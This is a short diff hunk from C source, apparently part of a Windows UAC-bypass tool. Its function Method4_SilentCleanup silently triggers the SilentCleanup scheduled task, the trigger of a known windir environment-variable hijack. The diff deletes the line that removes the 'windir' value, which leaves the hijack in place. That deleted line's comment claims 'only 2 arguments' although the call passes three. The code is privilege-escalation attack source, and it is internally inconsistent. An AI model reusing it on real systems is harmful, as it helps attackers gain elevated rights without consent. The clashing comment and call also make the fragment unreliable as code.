@@ -103,7 +103,6 @@ BOOL Method4_SilentCleanup(void) {
     ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\schtasks.exe"), TEXT("/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"), NULL, SW_HIDE);
     Sleep(3500);
 
-    RegDeleteValue(HKEY_CURRENT_USER, TEXT("Environment"), TEXT("windir"));  // FIXED - only 2 arguments
     return TRUE;
 }
 
